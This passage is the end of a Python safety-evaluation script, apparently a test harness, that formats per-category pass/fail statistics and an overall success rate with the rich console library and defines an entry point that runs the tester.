            total_cat = stats["passed"] + stats["failed"]
            rate = (stats["passed"] / total_cat * 100) if total_cat > 0 else 0
            cat_table.add_row(
                category,
                str(stats["passed"]),
                str(stats["failed"]),
                f"{rate:.1f}%"
            )
        
        console.print(cat_table)
        
        # Overall summary
        console.print(f"\n[bold]Overall Summary:[/bold]")
        console.print(f"Total Tests: {results['total_tests']}")
        console.print(f"Passed: [green]{results['tests_passed']}[/green]")
        console.print(f"Failed: [red]{results['tests_failed']}[/red]")
        console.print(f"Success Rate: [{'green' if results['success_rate'] >= 90 else 'yellow'}]{results['success_rate']:.1f}%[/]")


def evaluate_safety_system() -> Dict:
    """Main entry point for safety evaluation"""
    tester = ComprehensiveSafetyTester()
    results = tester.run_all_tests()
    tester.display_results(results)
    return results


if __name__ == "__main__":
    evaluate_safety_system()